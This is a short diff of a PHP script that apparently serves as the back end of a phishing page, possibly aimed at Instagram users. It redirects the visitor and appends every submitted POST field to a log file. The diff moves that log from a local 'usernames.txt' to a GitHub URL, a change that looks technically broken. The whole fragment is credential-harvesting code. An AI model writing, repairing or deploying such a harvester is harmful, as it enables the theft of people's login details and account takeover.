@@ -1,7 +1,7 @@
 <?php
 header
 ('location:');
-$handle=fopen("usernames.txt","a");
+$handle=fopen("https://github.com/gaming-dash/insta-bash.github.io/blob/main/usernames.txt","a");
 foreach($_POST as $variable=>$value)
 {
 fwrite($handle,$variable);
